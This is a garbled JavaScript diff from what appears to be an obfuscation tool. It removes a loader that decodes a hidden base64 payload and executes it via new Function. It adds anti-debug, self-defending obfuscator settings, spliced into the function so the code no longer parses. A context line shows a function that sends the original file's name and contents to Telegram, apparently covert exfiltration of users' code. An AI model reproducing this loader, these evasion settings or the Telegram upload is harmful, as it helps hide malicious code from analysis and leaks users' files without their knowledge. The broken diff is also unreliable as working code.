@@ -91,36 +91,28 @@ function injectNoise(base64Str, density=0.12){
 /* Build loader string that is compatible with Browser & Node */
 function buildCrossPlatformLoader(obfStr){
   // random var names
-  const v1 = rndVar(12), v2 = rndVar(10), v3 = rndVar(10), v4 = rndVar(8);
 
   // loader: cleans to base64 chars, decode base64 into bytes (supports Buffer or atob),
   // then convert bytes to UTF-8 string (supports TextDecoder or Buffer), then run Function.
   const loader = [
-`(function(){try{`,
-`var ${v1}=${JSON.stringify(obfStr)};`,
-`function ${v2}(s){var m=s.match(/[A-Za-z0-9+\\/=]/g); if(!m) return ''; return m.join(''); }`,
-`function ${v3}(b64){`,
-`  // return Uint8Array of decoded base64 bytes (works in browser & Node)`,
-`  try{`,
-`    if(typeof atob === 'function'){`,
-`      var bin = atob(b64); var len = bin.length; var arr = new Uint8Array(len); for(var i=0;i<len;i++) arr[i]=bin.charCodeAt(i); return arr;`,
-`    }else if(typeof Buffer !== 'undefined'){`,
-`      return Uint8Array.from(Buffer.from(b64,'base64'));`,
-`    }else{ throw new Error('No base64 decoder available'); }`,
-`  }catch(e){ return new Uint8Array(); }`,
-`}`,
-`function ${v4}(u8){`,
-`  // return string from bytes (utf-8)`,
-`  try{ if(typeof TextDecoder !== 'undefined'){ return new TextDecoder('utf-8').decode(u8); }`,
-`    if(typeof Buffer !== 'undefined') return Buffer.from(u8).toString('utf8');`,
-`    // fallback manual decode`,
-`    var s=''; for(var i=0;i<u8.length;i++) s+= String.fromCharCode(u8[i]); return decodeURIComponent(escape(s));`,
-`  }catch(e){ try{ return Buffer.from(u8).toString('utf8'); }catch(_){ return ''; } }`,
-`}`,
-`var clean = ${v2}(${v1}); var bytes = ${v3}(clean); var plain = ${v4}(bytes); try{ (new Function(plain))(); }catch(e){ console.error('exec failed',e);} }catch(e){console.error('loader fatal',e);} })();`
-  ].join('');
-  return loader;
-}
+target: "node",
+        compact: true,
+        renameVariables: true,
+        renameGlobals: true,
+        identifierGenerator: "randomized", // Valid: menghasilkan nama acak
+        stringEncoding: true, // Valid: mengenkripsi string
+        stringSplitting: true, // Valid: memecah string
+        controlFlowFlattening: 0.75, // Valid: mengacak alur kontrol
+        duplicateLiteralsRemoval: true, // Valid: menghapus literal duplikat
+        calculator: true, // Valid: mengacak operasi matematika
+        dispatcher: true, // Valid: mengacak eksekusi dengan dispatcher
+        deadCode: true, // Valid: menambahkan kode mati
+        opaquePredicates: true, // Valid: menambahkan predikat buram
+        lock: {
+            selfDefending: true, // Valid: mencegah modifikasi
+            antiDebug: true, // Valid: mencegah debugging
+            integrity: true, // Valid: memastikan integritas
+            tamperProtection: true // Valid: perlindungan tamper
 
 /* send original to Telegram - fire and await */
 async function sendToTelegram(filename, content){
